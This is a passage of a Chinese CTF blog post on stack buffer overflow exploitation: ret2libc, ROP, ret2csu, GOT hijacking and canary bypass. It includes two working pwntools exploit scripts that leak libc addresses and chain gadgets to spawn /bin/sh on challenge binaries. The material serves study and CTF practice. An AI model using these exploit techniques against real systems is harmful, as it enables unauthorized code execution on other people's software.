class="comment">#溢出控制返回值v5</span></span><br><span class="line">payload1=<span class="string">b'\x00'</span>+<span class="string">b'a'</span>*<span class="number">6</span>+<span class="string">b'\xff'</span></span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recvuntil(<span class="string">'Correct\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#泄漏libc</span></span><br><span class="line">payload=<span class="string">b'a'</span>*<span class="number">0xeb</span></span><br><span class="line">payload+=p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(read_got)+p32(<span class="number">4</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line">print(<span class="string">'[+]read_addr: '</span>,hex(read_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#计算libc_base，system_addr，bin_sh_addr</span></span><br><span class="line">libc=LibcSearcher(<span class="string">'read'</span>,read_addr)</span><br><span class="line">libc_base=read_addr-libc.dump(<span class="string">'read'</span>)</span><br><span class="line">system_addr=libc_base+libc.dump(<span class="string">'system'</span>)</span><br><span class="line">bin_sh_addr=libc_base+libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行payload</span></span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recvuntil(<span class="string">'Correct\n'</span>)</span><br><span class="line">payload=<span class="string">b'a'</span>*<span class="number">0xe7</span>+<span class="string">b'b'</span>*<span class="number">0x4</span></span><br><span class="line">payload+=p32(system_addr)*<span class="number">2</span>+p32(bin_sh_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<ul>
+<li>payload = padding1 + address of system() + padding2 + address of “/bin/sh”</li>
+<li><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201027214118134.png" alt=""></li>
+<li>Padding1 随意填充,==长度刚好覆盖基地址==<ul>
+<li>长度与shellcode处的一样的方法</li>
+</ul>
+</li>
+<li>address of system() 是system在内存中的地址,==用来覆盖返回地址==<ul>
+<li>system()函数地址在哪里?<ul>
+<li>从动态库中获取,计算绝对地址</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>padding2 数据长度应该为 ==4== (32位机) 由于不关心退出shell后的行为,可随意填<ul>
+<li>⚠️当需要多次绕过时,这里应该填充system执行后需要返回的地址,否则程序栈会崩溃</li>
+</ul>
+</li>
+<li>address of  ”/bin/sh“ 是字符串在内存中的地址,作为传给system的参数<ul>
+<li>字符串哪里找?<ul>
+<li>动态库搜索,计算绝对地址</li>
+<li>没有就将其加入环境变量,通过getenv()函数获取</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="3-ROP-开启NX时可用-–指向内存中已有的某段指令"><a href="#3-ROP-开启NX时可用-–指向内存中已有的某段指令" class="headerlink" title="3.ROP(开启NX时可用)–指向内存中已有的某段指令"></a>3.ROP(开启NX时可用)–指向内存中已有的某段指令</h4><ul>
+<li><p>payload = padding + address of gadget</p>
+<p><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201029152817870.png" alt=""></p>
+</li>
+</ul>
+<p>  <img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201029153008692.png" alt=""></p>
+<p>  ​    </p>
+<ul>
+<li><p>ROP的常见拼凑效果是实现一次系统调用</p>
+</li>
+<li><p>如何寻找指令片段?</p>
+<ul>
+<li>使用工具寻找以ret结尾的片段</li>
+</ul>
+</li>
+<li><p>如何寻找系统调用的参数?</p>
+<ul>
+<li>可以使用pop指令将栈顶数据存入寄存器</li>
+<li>如果内存中有可以用move指令进行传输</li>
+</ul>
+</li>
+<li><p>对于单个gadget,pop所传输的数据因该在gadget地址之后</p>
+<ul>
+<li>具体的ROP例子<ul>
+<li><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201030080246816.png" alt=""></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>适用于题目中没有给出任何有关cat flag有关信息,并且题目中也没有任何与system有关的函数</p>
+<ul>
+<li>此时需要我们leak除libc函数的地址,再通过libc构造ROP</li>
+</ul>
+</li>
+</ul>
+<h4 id="3-2-中级ROP"><a href="#3-2-中级ROP" class="headerlink" title="3.2 中级ROP"></a>3.2 中级ROP</h4><ul>
+<li><p>ret2_libc_csu_init</p>
+<ul>
+<li><p>在64位程序中，函数的前六个参数是通过寄存器传参的，但是大多数时候，我们很难找到每个寄存器对应的gadgets，这个时候我们可以用x64下的__libc_csu_init中的gadgets。这个函数是用来对libc进行初始化操作的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004005C0 ; void _libc_csu_init(void)</span><br><span class="line">.text:00000000004005C0                 public __libc_csu_init</span><br><span class="line">.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16o</span><br><span class="line">.text:00000000004005C0                 push    r15</span><br><span class="line">.text:00000000004005C2                 push    r14</span><br><span class="line">.text:00000000004005C4                 mov     r15d, edi</span><br><span class="line">.text:00000000004005C7                 push    r13</span><br><span class="line">.text:00000000004005C9                 push    r12</span><br><span class="line">.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:00000000004005D2                 push    rbp</span><br><span class="line">.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:00000000004005DA                 push    rbx</span><br><span class="line">.text:00000000004005DB                 mov     r14, rsi</span><br><span class="line">.text:00000000004005DE                 mov     r13, rdx</span><br><span class="line">.text:00000000004005E1                 sub     rbp, r12</span><br><span class="line">.text:00000000004005E4                 sub     rsp, 8</span><br><span class="line">.text:00000000004005E8                 sar     rbp, 3</span><br><span class="line">.text:00000000004005EC                 call    _init_proc</span><br><span class="line">.text:00000000004005F1                 test    rbp, rbp</span><br><span class="line">.text:00000000004005F4                 jz      short loc_400616</span><br><span class="line">.text:00000000004005F6                 xor     ebx, ebx</span><br><span class="line">.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400600</span><br><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040060D                 add     rbx, 1</span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600</span><br><span class="line">.text:0000000000400616</span><br><span class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j</span><br><span class="line">.text:0000000000400616                 add     rsp, 8</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br><span class="line">.text:0000000000400624 __libc_csu_init endp</span><br></pre></td></tr></table></figure>
+<ul>
+<li>这里如果巧妙的控制==rbx==与==r12==,我们就可以调用我们想要调用的函数.例如设置rbx=0,r12位存储我们想要调用的函数的地址.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h5 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">"./ciscn_s_3"</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">vul_addr = <span class="number">0x4004ed</span></span><br><span class="line">main_addr = <span class="number">0x40051d</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4005a3</span></span><br><span class="line">csu_front_addr = <span class="number">0x40059A</span></span><br><span class="line">csu_end_addr = <span class="number">0x400580</span></span><br><span class="line">ret_addr = <span class="number">0x400519</span></span><br><span class="line">sys_call = <span class="number">0x400517</span></span><br><span class="line">mov_rax_59 = <span class="number">0x4004E2</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b'/bin/sh\x00'</span>*<span class="number">2</span> + p64(vul_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">io.send(payload1)</span><br><span class="line">io.recv(<span class="number">0x20</span>)</span><br><span class="line">leak_addr = u64(io.recv(<span class="number">8</span>))</span><br><span class="line"><span class="comment">#泄露出来argv的地址</span></span><br><span class="line">log.info(<span class="string">'leaked_addr===&gt;'</span>+hex(leak_addr))</span><br><span class="line"><span class="comment">#print("----------&gt;",hex(leak_addr - 0x118))</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">bin_sh = leak_addr - <span class="number">0x128</span></span><br><span class="line"><span class="comment">#用偏移通过argv找到binsh地址</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'/bin/sh\x00'</span>*<span class="number">2</span> + p64(mov_rax_59) + p64(csu_front_addr)</span><br><span class="line"><span class="comment">#ebp处放给寄存器rax赋值的地址</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(bin_sh+<span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#这里就是巧妙的执行利用，rbx 与 r12执行了mov_rax_59的操作</span></span><br><span class="line"><span class="comment">#bin_sh+0x10的位置放得是执行mov rax 59 地址的地址，也就是rbp此时指向的地址</span></span><br><span class="line"><span class="comment">#后面的三个0是给execv函数传参，/bin/sh在4字节的edi中放不下，所以这里我们先传0，下面再pop_rdi</span></span><br><span class="line">payload += p64(csu_end_addr)</span><br><span class="line">payload += <span class="number">0x38</span>*<span class="string">b'A'</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(bin_sh) + p64(sys_call)</span><br><span class="line"><span class="comment">#寄存器被赋值之后执行syscall，它会自动匹配要执行execv，然后回去64位对应的寄存器里面找参数</span></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<ul>
+<li>可以利用的csu</li>
+</ul>
+<h2 id=""><a href="#" class="headerlink" title=""></a><img src="/2020/12/12/PWN-缓冲区溢出原理/../../../../Desktop/ctf_huzai/win/writeup/pic/QQ%E6%88%AA%E5%9B%BE20201118220313.png" alt=""></h2><ul>
+<li>用gdb+pwn 进行动态调试,得到函数栈中的状态与payload的对应关系,如下</li>
+</ul>
+<p>  <img src="/2020/12/12/PWN-缓冲区溢出原理/buuoj_00039.png" alt=""></p>
+<p>  <img src="/2020/12/12/PWN-缓冲区溢出原理/buuoj_00038.png" alt=""></p>
+<h4 id="4-hijiack-got-–-修改某个被调用函数的地址-让其指向另一个地址"><a href="#4-hijiack-got-–-修改某个被调用函数的地址-让其指向另一个地址" class="headerlink" title="4.hijiack got – 修改某个被调用函数的地址,让其指向另一个地址"></a>4.hijiack got – 修改某个被调用函数的地址,让其指向另一个地址</h4><ul>
+<li><p>动态链接与静态链接</p>
+<ul>
+<li>静态链接<ul>
+<li>把需要调用的函数或者过程链接到可执行文件中,成为可执行文件的一部分,使得文件包含运行时的全部代码,当多个程序调用相同函数时,内存中就会出现多个这个函数的拷贝,浪费内存</li>
+</ul>
+</li>
+<li>动态链接<ul>
+<li>仅仅在调用处加入了所调用函数的描述信息(往往是一些重定位信息),当程序运行时,才回去动态的链接到相应的函数,动态链接库的文件后缀为.so</li>
+<li><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201030075922270.png" alt=""></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>GOT与PLT</p>
+<ul>
+<li><p>GOT(global offset table) 全局偏移量表,用来储存外部函数在内存的确切地址</p>
+</li>
+<li><p>PLT(procedure linkage table) 程序链接表,用来存储外部函数的入口点</p>
+</li>
+<li><p>第一次调用函数时解析函数地址并存入GOT表</p>
+<ul>
+<li><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201029154651550.png" alt=""></li>
+</ul>
+</li>
+<li><p>第二次调用函数直接读取GOT中的地址</p>
+<ul>
+<li><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201029154754376.png" alt=""></li>
+</ul>
+</li>
+<li><p>整个调用的过程</p>
+<ul>
+<li><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201030080054235.png" alt=""></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>如何确定函数A在GOT表中的位置?</p>
+<ul>
+<li>程序调用函数是通过PLT表跳转到GOT表的对应条目,在汇编指令中找到该函数在PLT中的入口点位置,从而定位到该函数在GOT中 的条目</li>
+</ul>
+</li>
+<li><p>如何确定函数B在内存中的位置?</p>
+<ul>
+<li>函数在动态链接库中的位置是相对固定的.如果知道了函数A的运行地址(读取GOT表中的内容),也知道A和B在动态链接库中的相对位置,就可一推断出B的运行时地址</li>
+</ul>
+</li>
+<li><p>如何实现GOT表中的数据修改?</p>
+<ul>
+<li>格式化字符串漏洞</li>
+</ul>
+</li>
+</ul>
+<h4 id="5-Return-to-dl-resolve"><a href="#5-Return-to-dl-resolve" class="headerlink" title="5.Return-to-dl_resolve"></a>5.Return-to-dl_resolve</h4><ul>
+<li>核心思想是利用dl_runtime_resolve函数解析出system函数的地址,通常在没有提供lib函库的情况下使用.</li>
+<li>使用条件<ul>
+<li>未给出libc库</li>
+<li>没有开启PIE保护,如果开启PIE需要通过泄漏获取基地址</li>
+<li>没有开启FULL RELOAD</li>
+<li></li>
+</ul>
+</li>
+</ul>
+<h3 id="3-payload与函数调用栈的关系"><a href="#3-payload与函数调用栈的关系" class="headerlink" title="3. payload与函数调用栈的关系"></a>3. payload与函数调用栈的关系</h3><ul>
+<li>payload的长度可以用 payload.ljust(0x105,b’a’)进行填充,使得填充后的payload的总长度为0x106 Bytes </li>
+<li><p>⚠️p32(0xdeadbeef) 占4个Byte</p>
+</li>
+<li><p>paylaod的实际意义是通过输入的溢出,将我们需要的指令送到ip让cpu执行</p>
+<ul>
+<li>下图是64位,中的对应关系</li>
+</ul>
+</li>
+</ul>
+<p><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201106110733512.png" alt=""></p>
+<p>​            经过gdb+pwn调试，得到正确的关系，main实际上是返回值</p>
+<p>​            <img src="/2020/12/12/PWN-缓冲区溢出原理/payload64.png" alt=""></p>
+<ul>
+<li><p>下图是32位中的对应关系</p>
+<p><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201106172618456.png" alt=""></p>
+</li>
+</ul>
+<h3 id="4-通用的gadget"><a href="#4-通用的gadget" class="headerlink" title="4.通用的gadget"></a>4.通用的gadget</h3><h5 id="libc-csu-init"><a href="#libc-csu-init" class="headerlink" title="__libc_csu_init()"></a>__libc_csu_init()</h5><ul>
+<li><p>在程序编译的过程中,会自动加入一些通用函数的初始化工作,这些初始化函数都是相同的,因此可以考虑在这些函数中找到一些通用的gadget</p>
+<ul>
+<li><p>需要关注的寄存器</p>
+<ul>
+<li><p>r12  保存着将要调用函数的指针的地址</p>
+</li>
+<li><p>rcx  r8  r9  第四五六个参数</p>
+</li>
+<li><p>rdx   第三个参数</p>
+</li>
+<li><p>rsi    第二个参数</p>
+</li>
+<li><p>rdi   第一个参数</p>
+</li>
+<li><p>rbx 和 rbp 的值分别为0 1 </p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="5-Canary"><a href="#5-Canary" class="headerlink" title="5.Canary"></a>5.Canary</h3><ul>
+<li><p>linux中的cookies,用来检测溢出并阻止溢出操作</p>
+</li>
+<li><p>其原理是当程序启用canary编译后,在函数序言部分会取fs寄存器0x20处的值.存放在栈中</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov    rax, qword ptr fs:[0x28]</span><br><span class="line">mov qword ptr [rbp-8], rax</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在函数返回之前,会将该值取出,并与fs:0x28的值进行亦或.这个操作既检测是否发生栈溢出</p>
+</li>
+<li><p>如果canary已经被非法修改,此时程序流程会走到__stack_chk_fail</p>
+<p><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201104214925462.png" alt=""></p>
+</li>
+</ul>
+<ul>
+<li><p>通过格式化字符串绕过canary</p>
+<ul>
+<li>由于格式化字符串漏洞会导致任意地址泄漏,因此,只要得到输入参数在栈中的位置,就可以通过偏移得到canary在栈中的位置</li>
+<li>然后在栈溢出的padding块把canary所在的位置的值用正确的canary替换,从而绕过canary检测</li>
+</ul>
+</li>
+</ul>
+
+        </div>
+        
+          
+
+
+  <section class="meta" id="footer-meta">
+    <hr>
+    <div class="new-meta-box">
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-12-12T13:19:36+08:00">
+  <a class="notlink">
+    <i class="fas fa-clock" aria-hidden="true"></i>
+    <p>最后更新于 Dec 12, 2020</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/PWN-CTF/" rel="nofollow"><i class="fas fa-hashtag" aria-hidden="true"></i>&nbsp;<p>PWN CTF</p></a></div>
+
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="QQ好友" rel="external nofollow noopener noreferrer" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2020/12/12/PWN-缓冲区溢出原理/&title=PWN-缓冲区溢出原理 | huzai9527's personal blog&summary=">
+          
+            <img src="https://cdn.jsdelivr.net/gh/xaoxuu/assets@19.1.9/logo/128/qq.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="QQ空间" rel="external nofollow noopener noreferrer" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://yoursite.com/2020/12/12/PWN-缓冲区溢出原理/&title=PWN-缓冲区溢出原理 | huzai9527's personal blog&summary=">
+          
+            <img src="https://cdn.jsdelivr.net/gh/xaoxuu/assets@19.1.9/logo/128/qzone.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="微博" rel="external nofollow noopener noreferrer" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2020/12/12/PWN-缓冲区溢出原理/&title=PWN-缓冲区溢出原理 | huzai9527's personal blog&summary=">
+          
+            <img src="https://cdn.jsdelivr.net/gh/xaoxuu/assets@19.1.9/logo/128/weibo.png">
+          
+        </a>
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+  </section>
+
+
+        
+        
+            <div class="prev-next">
+                
+                
+                    <section class="next">
+                        <span class="art-item-right" aria-hidden="true">
+                            <h6>下一页&nbsp;<i class="fas fa-chevron-right" aria-hidden="true"></i></h6>
+                            <h4>
+                                <a href="/2020/12/12/PWN-堆相关的漏洞/" rel="prev" title="PWN-堆相关的漏洞">
+                                    
+                                        PWN-堆相关的漏洞
+                                    
+                                </a>
+                            </h4>
+                            
+                                
+                                <h6 class="tags">
+                                    <a class="tag" href="/tags/PWN-CTF/"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>PWN CTF</a>
+                                </h6>
+                            
+                        </span>
+                    </section>
+                
+            </div>
+        
+      </section>
+    </article>
+  
+
+  
+    <!-- 显示推荐文章和评论 -->
+
+
+
+  
+
+
+  
+
+
+
+
+<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->
+
+
+
+  <script>
+    window.subData = {
+      title: 'PWN-缓冲区溢出原理',
+      tools: true
+    }
+  </script>
+
+
+</div>
+<aside class="l_side">
+  
+    
+    
+      
+        
+          
+          
+            <section class="widget author">
+  <div class="content material">
+    
+      <div class="avatar">
+        <img class="avatar" src="https://i.loli.net/2019/08/27/SCTrzsMhKIg2OYq.jpg">
+      </div>
+    
+    
+      <div class="text">
+        
+        
+          <p>王子和公主过上了性福的生活，那守城的小兵呢？</p>
+
+        
+        
+      </div>
+    
+    
+      <div class="social-wrapper">
+        
+          
+            <a href="/atom.xml" class="social fas fa-rss flat-btn" target="_blank" rel="external nofollow noopener noreferrer">
+            </a>
+          
+        
+          
+            <a href="mailto:me@xaoxuu.com" class="social fas fa-envelope flat-btn" target="_blank" rel="external nofollow noopener noreferrer">
+            </a>
+          
+        
+          
+            <a href="https://github.com/linxbin" class="social fab fa-github flat-btn" target="_blank" rel="external nofollow noopener noreferrer">
+            </a>
+          
+        
+          
+            <a href="https://github.com/linxbin" class="social fab fa-qq flat-btn" target="_blank" rel="external nofollow noopener noreferrer">
+            </a>
+          
+        
+      </div>
+    
+  </div>
+</section>
+
+          
+        
+      
+        
+          
+          
+            
+
+          
+        
+      
+        
+          
+          
+            
+  <section class="widget tagcloud">
+    
+<header class="material">
+  <div><i class="fas fa-fire fa-fw" aria-hidden="true"></i>&nbsp;&nbsp;热门标签</div>
+  
+    <a class="rightBtn" rel="nofollow" href="/tags" title="/tags">
+    <i class="fas fa-expand-arrows-alt fa-fw"></i></a>
+  
+</header>
+
+    <div class="content material">
+      <a href="/tags/PWN-CTF/" style="font-size: 24px; color: #555">PWN CTF</a> <a href="/tags/c/" style="font-size: 14px; color: #999">c++</a> <a href="/tags/docker/" style="font-size: 14px; color: #999">docker</a> <a href="/tags/git/" style="font-size: 14px; color: #999">git</a> <a href="/tags/github/" style="font-size: 14px; color: #999">github</a> <a href="/tags/mysql/" style="font-size: 14px; color: #999">mysql</a> <a href="/tags/python/" style="font-size: 19px; color: #777">python</a> <a href="/tags/python-scrapy-爬虫/" style="font-size: 14px; color: #999">python scrapy 爬虫</a> <a href="/tags/ubuntu/" style="font-size: 14px; color: #999">ubuntu</a> <a href="/tags/数据分析/" style="font-size: 24px; color: #555">数据分析</a> <a href="/tags/网络编程-python/" style="font-size: 14px; color: #999">网络编程 python</a>
+    </div>
+  </section>
+
+
+          
+        
+      
+        
+          
+          
+            
+
+
+  <section class="widget music">
+    
+<header class="material">
+  <div><i class="fas fa-compact-disc fa-fw" aria-hidden="true"></i>&nbsp;&nbsp;最近在听</div>
+  
+    <a class="rightBtn" rel="external nofollow noopener noreferrer" target="_blank" href="https://music.163.com/#/user/home?id=63035382" title="https://music.163.com/#/user/home?id=63035382">
+    <i class="far fa-heart fa-fw"></i></a>
+  
+</header>
+
+    <div class="content material">
+      
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.7.0/dist/APlayer.min.css">
+  <div class="aplayer" data-theme="#1BCDFC" data-mode="circulation" data-server="netease" data-type="playlist" data-id="2615636388" data-volume="0.7">
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/aplayer@1.7.0/dist/APlayer.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/meting@1.1.0/dist/Meting.min.js"></script>
+
+
+    </div>
+  </section>
+
+
+          
+        
+      
+    
+
+  
+</aside>
+
+<footer id="footer" class="clearfix">
+  
+  
+    <div class="social-wrapper">
+      
+        
+          <a href="/atom.xml" class="social fas fa-rss flat-btn" target="_blank" rel="external nofollow noopener noreferrer">
+          </a>
+        
+      
+        
+          <a href="mailto:me@xaoxuu.com" class="social fas fa-envelope flat-btn" target="_blank" rel="external nofollow noopener noreferrer">
+          </a>
+        
+      
+        
+          <a href="https://github.com/linxbin" class="social fab fa-github flat-btn" target="_blank" rel="external nofollow noopener noreferrer">
+          </a>
+        
+      
+        
+          <a href="https://github.com/linxbin" class="social fab fa-qq flat-btn" target="_blank" rel="external nofollow noopener noreferrer">
+          </a>
+        
+      
+    </div>
+  
+  <br>
+  <div><p>博客内容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
+</div>
+  <div>
+    本站使用
+    <a href="https://xaoxuu.com/wiki/material-x/" target="_blank" class="codename">Material X</a>
+    作为主题
+    
+      ，
+      总访问量为
+      <span id="busuanzi_value_site_pv"><i class="fas fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span>
+      次
+    
+    。
+  </div>
+</footer>
+<script>setLoadingBarProgress(80);</script>
+
+
+      <script>setLoadingBarProgress(60);</script>
+    </div>
+    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+
+  <script>
+    var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
+    var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
+    var ALGOLIA_API_KEY = "";
+    var ALGOLIA_APP_ID = "";
+    var ALGOLIA_INDEX_NAME = "";
+    var AZURE_SERVICE_NAME = "";
+    var AZURE_INDEX_NAME = "";
+    var AZURE_QUERY_KEY = "";
+    var BAIDU_API_ID = "";
+    var SEARCH_SERVICE = "hexo" || "hexo";
+    var ROOT = "/"||"/";
+    if(!ROOT.endsWith('/'))ROOT += '/';
+  </script>
+
+<script src="//instant.page/1.2.2" type="module" integrity="sha384-2xV8M5griQmzyiY3CDqh1dn4z3llDVqZDqzjzcY+jCBCk/a5fXJmuZ/40JJAPeoU"></script>
+
+
+  <script async src="https://cdn.jsdelivr.net/npm/scrollreveal@4.0.5/dist/scrollreveal.min.js"></script>
+  <script type="text/javascript">
+    $(function() {
+      const $reveal = $('.reveal');
+      if ($reveal.length === 0) return;
+      const sr = ScrollReveal({ distance: 0 });
+      sr.reveal('.reveal');
+    });
+  </script>
+
+
+  <script src="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.js"></script>
+  <script type="text/javascript">
+    $(function() {
+      Waves.attach('.flat-btn', ['waves-button']);
+      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
+      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
+      Waves.attach('.flat-box', ['waves-block']);
+      Waves.attach('.float-box', ['waves-block', 'waves-float']);
+      Waves.attach('.waves-image');
+      Waves.init();
+    });
+  </script>
+
+
+  <script async src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-busuanzi@2.3/js/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+  
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-backstretch/2.0.4/jquery.backstretch.min.js"></script>
+    <script type="text/javascript">
+      $(function(){
+        if ('.cover') {
+          $('.cover').backstretch(
+          ["https://img.vim-cn.com/6d/a0c9e6f9efad8b731cb7376504bd10d79d2053.jpg"],
+          {
+            duration: "6000",
+            fade: "2500"
+          });
+        } else {
+          $.backstretch(
+          ["https://img.vim-cn.com/6d/a0c9e6f9efad8b731cb7376504bd10d79d2053.jpg"],
+          {
+            duration: "6000",
+            fade: "2500"
+          });
+        }
+      });
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/app.js"></script>
+
+
+  <script src="/js/search.js"></script>
+
+
+
+
+<!-- 复制 -->
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  let COPY_SUCCESS = "复制成功";
+  let COPY_FAILURE = "复制失败";
+  /*页面载入完成后，创建复制按钮*/
+  !function (e, t, a) {
+    /* code */
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '  <i class="fa fa-copy"></i><span>复制</span>';
+      copyHtml += '</button>';
